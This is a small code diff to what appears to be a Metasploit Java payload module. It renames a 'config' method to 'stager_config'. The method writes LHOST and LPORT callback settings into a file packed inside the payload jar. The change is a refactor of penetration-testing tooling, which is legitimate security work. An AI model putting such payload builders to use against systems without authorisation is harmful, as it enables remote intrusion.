@@ -57,12 +57,12 @@ module MetasploitModule
       jar.add_file(path.join("/"), data)
     end
     jar.build_manifest(:main_class => "metasploit.Payload")
-    jar.add_file("metasploit.dat", config)
+    jar.add_file("metasploit.dat", stager_config)
 
     jar
   end
 
-  def config
+  def stager_config
     c =  ""
     c << "LHOST=#{datastore["LHOST"]}\n" if datastore["LHOST"]
     c << "LPORT=#{datastore["LPORT"]}\n" if datastore["LPORT"]
